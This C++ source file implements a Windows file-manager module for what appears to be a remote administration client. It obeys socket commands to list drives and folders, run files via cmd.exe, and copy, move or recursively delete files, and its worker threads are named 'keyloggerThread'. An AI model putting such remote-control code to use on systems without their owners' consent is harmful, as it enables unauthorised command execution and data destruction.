#include "FileManager.h"
#include "ThreadGen.h"

#include <utility>


std::string convertBytesToHumanSize(std::uintmax_t bytesSizeOfFile){
    if (bytesSizeOfFile>1024){
        std::uintmax_t op = bytesSizeOfFile / 1024;
        return static_cast<std::stringstream>(std::stringstream() << op).str().append(" KB");
    }
    return static_cast<std::stringstream>(std::stringstream() << bytesSizeOfFile).str().append(" Bytes");
}


nlohmann::json FileManager::readDirectory(const std::filesystem::path &directory) {
    nlohmann::json paths;
    paths["folders"] = nlohmann::json::array();
    paths["files"] = nlohmann::json::array();

    try {
        for (const auto &entry: std::filesystem::directory_iterator(directory)) {
            if (std::filesystem::is_directory(entry)) {
                paths["folders"].push_back(entry.path().filename().string());
            } else if (std::filesystem::is_regular_file(entry)) {
                nlohmann::json file_entry;
                file_entry["name"] = entry.path().filename().string();
                file_entry["size"] = convertBytesToHumanSize(std::filesystem::file_size(entry));
                paths["files"].push_back(file_entry);
            }
        }
    } catch (const std::filesystem::__cxx11::filesystem_error &) {
        paths["error"] = "ACCESS_DENIED";
    }

    return paths;
}


void FileManager::sendDirectory(nlohmann::json jsonObject){
    nlohmann::json json;
    json["RESPONSE"] = "DIRECTORY";
    json["requested_directory"] = jsonObject["path"];
    json["window_id"] = jsonObject["window_id"];
    json["directory"] = readDirectory(jsonObject["path"]);
    clientSocket.sendMessage(json);
}



void FileManager::sendDisks(){
    std::vector<std::string> vectorOfDisks = FileManager::getDisks();
    nlohmann::json json;
    json["RESPONSE"] = "DISKS";
    json["disks"] = vectorOfDisks;
    clientSocket.sendMessage(json);
}

std::vector<std::string> FileManager::getDisks() {
    DWORD dwSize = MAX_PATH;
    char szLogicalDrives[MAX_PATH] = {0};
    DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);
    std::vector<std::string> diskVector;
    if (dwResult > 0 && dwResult <= MAX_PATH) {
        char *szSingleDrive = szLogicalDrives;
        while (*szSingleDrive) {
            diskVector.emplace_back(szSingleDrive);
            szSingleDrive += strlen(szSingleDrive) + 1;
        }
    }
    return diskVector;
}

void FileManager::copyFiles(const std::vector<std::string> &vectorOfFiles,const std::vector<std::string> &vectorOfDirectories) {
    for (const auto &directory: vectorOfDirectories) {
        for (const auto &file: vectorOfFiles) {
            std::filesystem::path pathI = std::filesystem::path(file);
            std::filesystem::path pathF = std::filesystem::path(directory);
            pathF /= pathI.filename();
            if (!std::filesystem::exists(pathF)) {
                std::filesystem::copy(pathI, pathF, std::filesystem::copy_options::overwrite_existing |
                                                    std::filesystem::copy_options::recursive);
            }
        }
    }
}

void FileManager::moveFiles(const std::vector<std::string>& vectorOfFiles, const std::string& directory) {
    for (const auto &file: vectorOfFiles) {
        std::filesystem::path pathI = std::filesystem::path(file);
        std::filesystem::path pathF = std::filesystem::path(directory);
        pathF /= pathI.filename();
        if (!std::filesystem::exists(pathF)) {
            std::filesystem::rename(pathI, pathF);
        }
    }
}

void FileManager::deleteFiles(const std::vector<std::string>&vectorOfFiles) {
    for (const auto &file: vectorOfFiles) {
        std::filesystem::remove_all(std::filesystem::path(file));
    }
}

void FileManager::runFiles(const std::vector<std::string> &vectorOfFiles) {
    for (const auto &file: vectorOfFiles) {
        STARTUPINFOW process_startup_info{};
        process_startup_info.cb = sizeof(process_startup_info);
        PROCESS_INFORMATION process_info{};

        std::wstring convertedString = Converter::string2wstring(file); // converting string to wstring
        std::wstring commandLine;
        if (std::filesystem::is_directory(convertedString)) {
            commandLine.append(L"explorer.exe ");
        } else {
            commandLine.append(L"cmd.exe /c ");
        }
        commandLine.append(L"\"").append(convertedString).append(L"\"");
        if (CreateProcessW(nullptr, (LPWSTR) commandLine.data(), nullptr, nullptr, TRUE, 0, nullptr, nullptr,
                           &process_startup_info, &process_info)) {
            WaitForSingleObject(process_info.hProcess, INFINITE);
            CloseHandle(process_info.hProcess);
            CloseHandle(process_info.hThread);
        }
    }
}

void FileManager::runFilesThread(nlohmann::json jsonObject){
    std::vector<std::string> vectorOfFiles = jsonObject["from_paths"];
    std::thread keyloggerThread(&FileManager::runFiles, this,vectorOfFiles);
    keyloggerThread.detach();
}

void FileManager::deleteFilesThread(nlohmann::json jsonObject) {
    std::vector<std::string> vectorOfFiles = jsonObject["from_paths"];
    std::thread keyloggerThread(&FileManager::deleteFiles, this,vectorOfFiles);
    keyloggerThread.detach();
}

void FileManager::moveFilesThread(nlohmann::json jsonObject) {
    std::vector<std::string> vectorOfFiles = jsonObject["from_paths"];
    std::string directory = jsonObject["to_path"];
    std::thread keyloggerThread(&FileManager::moveFiles, this,vectorOfFiles,directory);
    keyloggerThread.detach();
}

void FileManager::copyFilesThread(nlohmann::json jsonObject){
    std::vector<std::string> vectorOfFiles = jsonObject["from_paths"];
    std::vector<std::string> vectorOfDirectories = jsonObject["to_paths"];
    std::thread keyloggerThread(&FileManager::copyFiles, this,vectorOfFiles,vectorOfDirectories);
    keyloggerThread.detach();
}


FileManager::FileManager(ClientSocket &clientSocket) : Handler(clientSocket) {
    ActionMap& actionMap = clientSocket.getActionMap();
    actionMap["RUN"] =[&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &FileManager::runFilesThread, json);
    };
    actionMap["COPY"]  = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &FileManager::copyFilesThread, json);
    };
    actionMap["DELETE"]  = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &FileManager::deleteFilesThread, json);
    };
    actionMap["MOVE"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &FileManager::moveFilesThread, json);
    };
    actionMap["DISKS"]  = [&](nlohmann::json& json) {
        std::cout << "hello world" << std::endl;
        threadGen.runInNewThread(this, &FileManager::sendDisks);
    };
    actionMap["DIRECTORY"]  = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &FileManager::sendDirectory, json);
    };
}











